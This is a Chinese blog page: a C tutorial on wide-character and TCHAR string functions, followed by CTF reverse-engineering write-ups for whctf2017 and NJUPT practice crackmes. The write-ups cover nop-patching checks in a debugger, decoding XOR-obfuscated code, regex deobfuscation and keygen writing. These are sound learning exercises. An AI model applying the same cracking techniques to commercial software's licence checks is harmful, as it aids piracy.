<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	char c = &apos;国&apos;;</span><br><span class="line"></span><br><span class="line">	char str[] = &quot;中国&quot;;</span><br><span class="line"></span><br><span class="line">	int i;</span><br><span class="line"></span><br><span class="line">	i = strlen(str);</span><br><span class="line"></span><br><span class="line">	printf(&quot;%c\n&quot;, c);</span><br><span class="line"></span><br><span class="line">	printf(&quot;%s\n&quot;, str);</span><br><span class="line"></span><br><span class="line">	printf(&quot;长度：%d\n&quot;, i);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如图：</p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20171107120001.png" alt=""></p>
<p>因为国字是以多字符存储存储的，但是<em>单字节变量C</em>只能存储一个字节的东西，这个时候会存储<strong>表示国字的多字符</strong>的后半个字节。所以会乱码！<br>鉴于多字符的不兼容性，所以发明出了Unicode</p>
<h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a><a href="#Unicode" title="Unicode"></a>Unicode</h3><p>Unicode是一种使用<strong>两个字节表示一个字符</strong>的编码，所以可以表示目前世界上的所有的字符。</p>
<p>使用Unicode的函数也不再是以前使用多字符集的那些函数了，二是对应的Unicode版(也就是现在所说的宽字符版）</p>
<p>宽字符版的字符类型：wchar_t</p>
<p>在给宽字符的<strong>字符变量和字符串变量</strong>赋值时要在前面加上L ，编译器才会将其识别并以unicode存储<strong><br>并且使用</strong>宽字符版的打印函数的格式控制串前要加L<strong>此外打印宽字符的格式说明符不再是%c而是</strong> %lc打印宽字符串的是%ls而不是%s**<br>下面是常见的字符处理函数对应的宽字符版：</p>
<blockquote>
<p>printf(“格式化控制串”,参数列表) ———— wprintf(L”格式化控制串”,参数列表)</p>
<p>strlen(str) ———- wcslen(str)</p>
<p>sprintf(目标字符缓冲区，”格式化控制串”,参数列表）————swprintf(目标字符缓冲区，L”格式化控制字符串”，参数列表）</p>
<p>_snprintf(目标字符缓冲区，最大长度，”格式化控制串”,参数列表）———–_snwprintf(目标字符缓冲区，最大长度，L”格式化控制串”,参数列表）</p>
</blockquote>
<p>参数数组的指针</p>
<blockquote>
<p>vsprintf(存放格式化控制串的数组指针，参数数组的指针)——— _vsprintf(存放格式化控制串的数组指针，参数数组的指针)</p>
</blockquote>
<p>下面的例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  wchar_t c = L&apos;国&apos;;</span><br><span class="line"></span><br><span class="line">	wchar_t str[] = L&quot;玩re的小明&quot;;</span><br><span class="line"></span><br><span class="line">	int i;</span><br><span class="line"></span><br><span class="line">	i = wcslen(str);</span><br><span class="line"></span><br><span class="line">	setlocale(LC_ALL, &quot;chs&quot;);    //设置语言为中文</span><br><span class="line"></span><br><span class="line">	wprintf(L&quot;%lc\n&quot;, c);</span><br><span class="line"></span><br><span class="line">	wprintf(L&quot;打印字符串:%ls\n&quot;, str);</span><br><span class="line"></span><br><span class="line">	wprintf(L&quot;字符串长度：%d\n&quot;, i);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果为：</p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20171107120001.png" alt=""></p>
<h3 id="windows通用版"><a href="#windows通用版" class="headerlink" title="windows通用版"></a><a href="#windows通用版" title="windows通用版"></a>windows通用版</h3><p>鉴于使用ascii码时不能使用unicode，反之亦然，所以windows推出了通用版本的这些函数,和变量类型 TCHAR</p>
<p>详细的话看图，使用方法和我上面写的一样。</p>
<p><strong>TCHAR.H这个头文件中包含了通用的函数和通用的字符类型</strong></p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20171107164237.png" alt=""></p>
<p>要补充的是通用版本的printf()为_tprintf(),使用时在<strong>控制字符串前加上_T()或者_TEXT()宏。然后在编译器的项目属性里面使用</strong>宽字符**即可，或者在源文件的最开头<br>加一句：</p>
<blockquote>
<p>#define _UNICODE //定义了这个宏 可以使用通用版本的函数和_T()、__T()、_TEXT()宏</p>
<p>#define UNICODE //定义了这个宏，就可以使用通用的数据类型，和TEXT()宏<br>下面是一个使用windows版的小程序</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TCHAR str[]=_T(&quot;玩re的小明&quot;);</span><br><span class="line"></span><br><span class="line">setlocale(LC_ALL, &quot;chs&quot;);   //设置语言为中文</span><br><span class="line"></span><br><span class="line">_tprintf(_T(&quot;%ls&quot;),str);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行结果：<br><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20171107165207.png" alt=""></p>
<p></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-writeup-for-whctf2017-re" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/05/04/writeup-for-whctf2017-re/" class="article-date">
  	<time datetime="2018-05-04T07:40:52.000Z" itemprop="datePublished">2018-05-04</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/04/writeup-for-whctf2017-re/">
        writeup for whctf2017 re
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="writeup-for-whctf-re部分"><a href="#writeup-for-whctf-re部分" class="headerlink" title="writeup for whctf re部分"></a>writeup for whctf re部分</h1><p>花了一天时间试了下whctf的水，比赛第一天做了两个题，后面的题连是啥也不知道，自己还是太菜，后来比赛快结束的时候去看了下题，发现又出了一道题，esayhook，当时太忙，没做，抽空逆了下这道题<br>算上这题的话，总共三个题的writeup，一直没写wp,写这个writeup算是对这个比赛做一点总结吧，顺便把坑填上，当然也给奋斗在二进制这条道路的小伙伴们一些帮助吧，虽然网上早已有writeup，但是我觉得还是很有必要分享下我<strong>自己的逆向思路</strong>，如果有朋友发现有错误遗漏之处，或者说是有更好的思路，咱们可以相互之间交流讨论下。</p>
<h2 id="Crackme"><a href="#Crackme" class="headerlink" title="Crackme"></a><a href="#Crackme" title="Crackme"></a>Crackme</h2><p>直接OD，先试着输入123456789<br>然后弹出一个对话框，一看就是messagebox，然后查看调用模块，Messagebox，发现有两个，两个都试着调试，然后你就会调试到下面的地方：</p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/4654651.png" alt=""></p>
<p>这里其实是先比较flag的长度，33.</p>
<p>在调试过程中，直接把它nop掉往后调，你就会发现，伪输入会一个一个的与flag比较，动态调的话，flag直接就出来！</p>
<h2 id="re2-BabyRE"><a href="#re2-BabyRE" class="headerlink" title="re2 BabyRE"></a><a href="#re2-BabyRE" title="re2  BabyRE"></a>re2 BabyRE</h2><ul>
<li><strong>试运行</strong></li>
</ul>
<p>和常规的re一样，一个叫你输入flag然后判断flag的正误。</p>
<ul>
<li><strong>静态分析</strong></li>
</ul>
<p>因为个人不擅长使用Linux所以很少使用Linux做re题，我看到网上大佬是用gdb动态调试然后在适当的地方下断点做出来的。<br>在这里小膜一下，那些大师傅们！所以我用Ida64打开看了下。</p>
<p><strong>graph模式：</strong>（如图）</p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20170929225128.png" alt=""><br><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20170929225304.png" alt=""><br>习惯看汇编就直接看，读的多了，能力就上升得很快了。<br>我在做题的时候采用边f5边用汇编看</p>
<p><strong>ps:注意下面的小红字sp analysis failed</strong><br>出现这种情况就是出题人使用了特殊的一些指令或者代码使得i<strong>da分析时堆栈不平衡了</strong>，以至于Ida不认为它是一个函数。所以使用f5的时候，会出现错误提示。</p>
<p><strong>怎么解决这种问题？</strong></p>
<p><strong>只要手动使堆栈平衡就行</strong></p>
<p><strong>1.按下空格转换到文本模式,拖到loc40062这个函数的附近</strong>如图：<img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20170929230113.png" alt=""><br><strong>2.打开ida上方的Option-&gt;General-&gt;将stack pointer 给勾上</strong>如图：<br><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20170930150329.png" alt=""></p>
<p>勾上后就会显示sp的值如图：</p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20170930150537.png" alt=""></p>
<p>注意我划线的地方，一个call之后的，栈指针就显示得很大了。<br>这就是为什么Ida不能自动识别的原因。<br><strong>怎么办呢？</strong></p>
<p>如果想修改某条指令的sp值的话，将鼠标指向他的上一条指令，然后按alt+k修改栈指针。修改的是时候需要根据堆栈平衡原理来改变相应指令的堆栈指针的值。</p>
<p>修改好的如下：<br><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20170930151344.png" alt=""></p>
<p>然后就可以f5了，如图：</p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20170930151608.png" alt=""></p>
<p>只能说有一点用，对新手友好一点而已，关键的地方还是要看汇编才能解决问题的。</p>
<p>关键的地方：</p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20170930151958.png" alt=""></p>
<p><strong>程序大致逻辑原理</strong>：</p>
<p>将一个数据段的内容，一字节形式与0xc相与，然后这个数据段变化成代码，然后调用这个函数，这个函数的参数就是我们输入的flag，其实质就是在比较我们的flag。</p>
<ul>
<li><strong>3写keygen</strong></li>
</ul>
<p>按我们之前的分析的话，得将那个数据段的内容分别与oxc想与，然后将处理后的内容作为一个函数调用，因此我们想写keygen的话必须把数据处理了来。</p>
<p>目前我知道的有两种方法：</p>
<p>-<strong>1.使用idapython</strong>（因为个人实在太菜，花了一个多小时看，还写不了，只能往后补坑了）</p>
<p>-<strong>2.使用winhex</strong>(这个是我无计可施的情况下，兔师傅告诉我的，感谢兔师傅，不然这题只能干瞪眼了)</p>
<p><strong>使用winhex修改代码</strong><br>在ida中找到相应的偏移地址，然后在winhex里面选中那一块，然后将其与oxc异或。就不细说了！<br>然后ida识别就行。</p>
<p>修改，识别之后如图：</p>
<h2 id="EasyHook"><a href="#EasyHook" class="headerlink" title="EasyHook"></a><a href="#EasyHook" title="EasyHook"></a>EasyHook</h2><h3 id="1-试运行"><a href="#1-试运行" class="headerlink" title="1.试运行"></a><a href="#1-试运行" title="1.试运行"></a>1.试运行</h3><p>没有什么特别的地方</p>
<h3 id="2-IDA静态分析"><a href="#2-IDA静态分析" class="headerlink" title="2.IDA静态分析"></a><a href="#2-IDA静态分析" title="2.IDA静态分析"></a>2.IDA静态分析</h3><p>由于之前分析了，后把文件给删了，逆向的注释都没有了，所以写的比较简洁。</p>
<p>先获得进程ID，然后打开对应的PID的进程获得句柄，然后，加载库文件，获得库文件中write函数的地址，然后将sub_401080-write函数的偏移地址-5传入 那个4010D0,然后修改当前进程中write函数的地址对应内存保护权限，然后调用writememory函数将传入的偏移地址的内容传送到write函数中，但是写入0个字节，所以根本没做什么实质性改变，然后调用write函数假装要些什么，实际上啥也没写，然后 401240这个函数 比较flag了，比较成功的话，就返回一，就验证成功了，网上的wp中都是用OD，调到那个函数里面去的，如果真的修改了，函数的内容，OD调试的话，难度还是很大的！</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-南邮re-writeup" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/05/04/南邮re-writeup/" class="article-date">
  	<time datetime="2018-05-04T07:38:22.000Z" itemprop="datePublished">2018-05-04</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/04/南邮re-writeup/">
        南邮re writeup
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="writeup-南邮攻防平台RE练习"><a href="#writeup-南邮攻防平台RE练习" class="headerlink" title="writeup-南邮攻防平台RE练习"></a>writeup-南邮攻防平台RE练习</h1><h1 id="RE300-第一题"><a href="#RE300-第一题" class="headerlink" title="RE300 第一题"></a>RE300 第一题</h1><h3 id="拖进IDA里面看一下："><a href="#拖进IDA里面看一下：" class="headerlink" title="拖进IDA里面看一下："></a><a href="#拖进IDA里面看一下：" title="拖进IDA里面看一下："></a>拖进IDA里面看一下：</h3><p><img src="http://ovni67v5o.bkt.clouddn.com/图片1.png" alt=""></p>
<p>易知flag长度为24,大致思路是输入flag，输入的flag经过sub_4005B6这个函数处理，处理之后看flag和dword_601060这个里面存的数据一致（涉及数据类型的转换）。</p>
<p>为了便于分析，修改了一下变量名，加了些注释：<br><img src="http://ovni67v5o.bkt.clouddn.com/图片2.png" alt=""><br>进入 flag处理函数看一下。<br><img src="http://ovni67v5o.bkt.clouddn.com/图片3.png" alt=""><br>有图可知是读取特定数据段中的数据元素，根据数据元素的值进行switch case操作，看循环便知道要进行5000次的循环，而且每个循环都是根据那个特定数据段中的5000个不同的数据来进行的不同的操作，动态调试的可能性几乎为0，只能静态分析，要是能提取出那个数据段中的15000个数据，逆向的进行循环操作就达到解密的操作了。<br>感谢杜神指点，才知道ida有一个专门的导出特定的数据的功能，不然这题我是没法做的，还是太菜。</p>
<p><strong>注意到：</strong></p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/图片4.png" alt=""></p>
<p>这个是dword数据，我逆的时候，没注意，改变了它的数据类型，写了错的解密程序，然后刚了一会汇编：</p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/图片5.png" alt=""></p>
<p>读到画圈的地方才恍然大悟，flag经过处理之后的结果要和这个601060数据段中以doubleword大小读取的前24个元素一致。这个crackme一共要导出两次数据。</p>
<p>下面进入15000的那个数据段，导出数据。一般情况下都是进去先把它根据情况设置为合适的数据类型，恰好这里就是字节型的，所以不用设置了。然后再把这些数组生成一个数组（右键，选着arry）</p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/图片6.png" alt=""></p>
<p>出现如图所示的直接确定就行，毕竟我对ida也不熟。<br>设为数组之后，按shif+e把他导出：</p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/图片7.png" alt=""></p>
<p>我是以16进制形式把他导出的。（ida会把这个这个数组以c语言声明定义数组的形式给导出到一个txt文件中）<br>另外一个数组同理可导出。</p>
<p>然后写一个解密的小程序就行，当时python不熟，用的c写的辣鸡小程序</p>
<p><a href="https://pan.baidu.com/s/1qY3Ft9q" target="_blank" rel="noopener">程序源文件和keygen打包</a></p>
<p>密码：as5r</p>
<h1 id="RE300-第二题"><a href="#RE300-第二题" class="headerlink" title="RE300 第二题"></a><a href="#RE300-第二题" title="RE300 第二题"></a>RE300 第二题</h1><p>占位等下写</p>
<h1 id="RE500"><a href="#RE500" class="headerlink" title="RE500"></a><a href="#RE500" title="RE500"></a>RE500</h1><p>这题还是有趣，学到了新技能：<strong>正则表达式</strong></p>
<h2 id="我的分析过程："><a href="#我的分析过程：" class="headerlink" title="我的分析过程："></a><a href="#我的分析过程：" title="我的分析过程："></a>我的分析过程：</h2><h3 id="使用ida打开大致看看"><a href="#使用ida打开大致看看" class="headerlink" title="使用ida打开大致看看"></a><a href="#使用ida打开大致看看" title="使用ida打开大致看看"></a>使用ida打开大致看看</h3><p>打开后，转换到<strong>graph</strong>模式<br>打开后如图：<br><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20170902200911.png" alt="ida graph显示"></p>
<p>可以看到结构当中的显眼的红字：<strong>Sorry, this node is too big to display</strong></p>
<p>鼠标点一下，按空格，转换为文本模式，如图：<br><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20170902201535.png" alt="ida文本模式"><br>手动下滑，当时被吓住了，滑动栏走得太慢了，一气呵成，拖到底，大致算了下，有60万条汇编指令…</p>
<p>回过神来，看了些汇编指令，发现绝大多数的指令都是再往几个变量里面赋值和异或什么的，大约有几十万条，明显就是在混淆</p>
<p>当时的思路就是，<strong>去其糟粕取其精华</strong></p>
<h3 id="ida-f5大法好啊"><a href="#ida-f5大法好啊" class="headerlink" title="ida f5大法好啊"></a><a href="#ida-f5大法好啊" title="ida f5大法好啊"></a>ida f5大法好啊</h3><p>指令太多，不适合刚，所以使用f5大法看看，由于有一部分的代码有60万之多，所以f5的时候，一度卡住了，造成了ida被日的假象，去问兔师傅被怼，<strong>要对ida有信心！</strong><br>所以等了十分钟左右，显示出了<strong>可爱的类C代码</strong>，如图：<br><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20170902210915.png" alt="f5大法好啊"></p>
<p>可以看到类似这样的语句：</p>
<blockquote>
<p>dword_6941B4 ^= dword_6941B0; 与某个变量异或<br>dword_694150 = -1304438312; 将一些值赋给变量</p>
</blockquote>
<p>往下使劲拖，<strong>发现事情开始变得简单</strong></p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20170902202650.png" alt="关键之处"></p>
<p>用re菜鸡的直觉感觉到了，这就是flag经过<strong>前面混淆部分的代码处理</strong>后，最终和<strong>目标</strong>进行比较</p>
<p>发现重要的东西只有<strong>byte_694100-byte_694119</strong>，这是flag存储的位置，和<strong>dword_694060</strong><br>这时我有一个大胆的想法，就是混淆语句都是处理的694119以后的，所以只要<strong>去除和694119以后位置的语句就行</strong></p>
<p>所以事情变得简单了：<br>只要去除混淆代码，真相就大白了。</p>
<h3 id="去除混淆代码"><a href="#去除混淆代码" class="headerlink" title="去除混淆代码"></a><a href="#去除混淆代码" title="去除混淆代码"></a>去除混淆代码</h3><p>俗话说，魔高一丈，道高一尺：</p>
<p>办法总比困难多。<strong>ctr + c</strong>复制到notepad++<br>开始处理。<br>可以看到：<br><img src="http://ovni67v5o.bkt.clouddn.com/QQ截图20170902203131.png" alt="相似"><br>有很多类似的语句怎么处理呢？</p>
<p>问了下兔师傅，兔师傅说用正则，于是花了些时间，学了下notepad的正则表达式，在<strong>查找里面打开正则表达式</strong>，查找到相应的大致语句，然后替换就行</p>
<p>这里有两个可以参靠的学习notepad++的正则的资料：</p>
<p><a href="http://blog.csdn.net/gdp12315_gu/article/details/51730584" target="_blank" rel="noopener"><strong>正则语法</strong></a></p>
<p><a href="https://www.crifan.com/files/doc/docbook/rec_soft_npp/release/htmls/npp_func_regex_replace.html" target="_blank" rel="noopener"><strong>正则使用学习例子</strong></a></p>
<p>使用</p>
<blockquote>
<p>dword_6941[^0-1][0-9A-F]\s\^= dword_6941[^0-1][0-9A-F]\;</p>
</blockquote>
<p>就可以去除上面<strong>相似</strong>中的语句。</p>
<p>使用：</p>
<blockquote>
<p>dword_6941[^0-1][0-9A-F]\s=\s\d+;<br>匹配赋值语句</p>
</blockquote>
<p>然后就是将byte_6941xx类的东西整理成相应的数组变量。<br>使用：</p>
<blockquote>
<p>byte_6941([0-2][0-9A-F])</p>
</blockquote>
<p>去匹配这些内容<br>，然后自己替换成：</p>
<blockquote>
<p>flag[0x\1]</p>
</blockquote>
<p>ps：这时候这个下标时16进制，后续还要处理，不过这个处理简单，不用正则就行，这个就不说了。</p>
<p>然后变得越来越清晰了。</p>
<p>实际上就是**将flag的位进行加减或者异或，只要逆序并且+变-，-变+，++变–，–变++<br>就能写出kegen了</p>
<h3 id="写keygen"><a href="#写keygen" class="headerlink" title="写ｋｅｙｇｅｎ"></a><a href="#写keygen" title="写ｋｅｙｇｅｎ"></a>写ｋｅｙｇｅｎ</h3><p>替换之后，然后将<strong>操作逆向替换就行</strong>（<em>+变-，-变+，++变–，–变++</em>)<br>最后就是将语句逆向了，排列了，问了下小伙伴，可以<strong>c语言用字符串数组数组实现</strong>也可以用<strong>c++的std流</strong>（好像是），我自己用的是py，py大法好啊<br>然后再逆过来即可</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2018 Notwolf
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="/js/main.js"></script>



<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>